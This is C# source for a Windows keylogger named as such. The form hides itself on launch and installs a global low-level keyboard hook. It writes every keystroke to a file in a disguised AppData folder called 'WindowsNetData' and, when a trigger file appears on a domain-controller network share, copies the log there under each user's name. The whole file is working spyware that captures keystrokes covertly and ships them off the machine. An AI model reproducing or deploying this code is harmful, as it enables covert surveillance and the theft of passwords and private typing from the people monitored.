using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class frmHome : Form
    {
        public frmHome()
        {
            InitializeComponent();
        }

        private void frmHome_Shown(object sender, EventArgs e)
        {
            this.Hide();
            GetServerIP();
            LogsFolder = string.Format("{0}\\public\\mFrancis Project Backups\\Logs", ServerIP);
            SetHook();
        }

        string LogsFolder;
        static string AppDataFolder = string.Format("{0}\\WindowsNetData", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

        // Global Hook
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        //Commands used for the hook - not variables
        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;

        private LowLevelKeyboardProc _proc = hookProc;

        private static IntPtr hhook = IntPtr.Zero;

        /// <summary>
        /// Start listening for keyboard activity
        /// </summary>
        void SetHook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
        }

        /// <summary>
        /// Hook processor
        /// </summary>
        /// <param name="code"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        static IntPtr hookProc(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code >= 0)
            {
                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);

                    if (MarkKeyPressed(vkCode))
                        WriteToAppData(vkCode, true);
                    else
                        WriteToAppData(vkCode);
                }
                else if (wParam == (IntPtr)WM_KEYUP)
                {
                    int vkCode = Marshal.ReadInt32(lParam);

                    if (MarkKeyPressed(vkCode))
                        WriteToAppData(vkCode, false);
                }
                return (IntPtr)0;
            }
            else
                return CallNextHookEx(hhook, code, (int)wParam, lParam);
        }

        /// <summary>
        /// Write the data to AppData including seperators
        /// </summary>
        /// <param name="vkCode">Keycode</param>
        /// <param name="UpDown">Up = false, Down = true</param>
        static void WriteToAppData(int vkCode, bool Mark, bool Pressed)
        {
            try
            {
                if (!Directory.Exists(AppDataFolder))
                    Directory.CreateDirectory(AppDataFolder);

                using (StreamWriter stream = new StreamWriter(string.Format("{0}\\MyData.dat", AppDataFolder), true))
                {
                    if (Mark)
                    {
                        string KeyIsDown;
                        if (Pressed)
                            KeyIsDown = "true";
                        else
                            KeyIsDown = "false";

                        stream.WriteLine(string.Format("{0}|{1},", vkCode, KeyIsDown));
                    }
                    else
                    {
                        stream.WriteLine(string.Format("{0},", vkCode));
                    }
                }
            }
            catch
            {
            }
        }

        string ServerIP;
        void GetServerIP()
        {
            try
            {
                IPAddress[] slmdcList = Dns.GetHostAddresses("slm-dc-01");
                slmdcList = slmdcList.Select(ip => Version.Parse(ip.ToString()))
                            .OrderBy(v => v)
                            .Select(v => IPAddress.Parse(v.ToString()))
                            .ToArray();

                ServerIP = string.Format(@"\\{0}", slmdcList[0]);
            }
            catch (Exception ex)
            {
                MessageBox.Show(string.Format("Error fetching slm-dc-01 ip address: \r\n{0}\r\nAssuming default IP of 192.168.1.4", ex.Message), "Error fetching slm-dc-01", MessageBoxButtons.OK, MessageBoxIcon.Error);
                ServerIP = @"\\192.168.1.4";
            }
        }

        static void WriteToAppData(int vkCode)
        {
            WriteToAppData(vkCode, false, true);
        }

        static void WriteToAppData(int vkCode, bool Pressed)
        {
            WriteToAppData(vkCode, true, Pressed);
        }

        static bool MarkKeyPressed(int vkCode)
        {
            switch (vkCode)
            {
                case 16:
                    return true;
                case 17:
                    return true;
                case 18:
                    return true;
                case 91:
                    return true;
                case 92:
                    return true;
                case 160:
                    return true;
                case 161:
                    return true;
                case 162:
                    return true;
                case 163:
                    return true;
                case 164:
                    return true;
                case 165:
                    return true;
                default:
                    return false;
            }
        }

        /// <summary>
        /// Stop listening for keyboard activity
        /// </summary>
        public void UnHook()
        {
            UnhookWindowsHookEx(hhook);
        }

        private void frmHome_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnHook();
        }

        private void tmrServerUpdate_Tick(object sender, EventArgs e)
        {
            if (ServerRequestsUpdate())
            {
                //Update server with latest data
                try
                {
                    File.Copy(string.Format("{0}\\MyData.dat", AppDataFolder), string.Format("{0}\\{1}'s Logs.txt", LogsFolder, Environment.UserName), true);
                }
                catch (Exception ex)
                {
                    try
                    {
                        if (!Directory.Exists(AppDataFolder))
                            Directory.CreateDirectory(AppDataFolder);

                        using (StreamWriter stream = new StreamWriter(string.Format("{0}\\Error logs.txt", AppDataFolder), true))
                        {
                            stream.WriteLine("Error occured updating server:");
                            stream.WriteLine(string.Format("Ex: {0}, Type: {1}", ex.Message, ex.GetType()));
                            stream.WriteLine(string.Format("Inner Ex: {0}, Type: {1}", ex.InnerException.Message, ex.InnerException.GetType()));
                        }
                    }
                    catch
                    {
                    }
                }
            }
        }

        bool ServerRequestsUpdate()
        {
            try
            {
                if (File.Exists(string.Format("{0}\\Update Logs.txt", LogsFolder)))
                {
                    using (StreamReader reader = new StreamReader(string.Format("{0}\\Update Logs.txt", LogsFolder)))
                    {
                        if (reader.ReadLine().ToLower() == "true")
                        {
                            return true;
                        }
                    }
                }
            }
            catch
            {
            }
            return false;
        }
    }
}
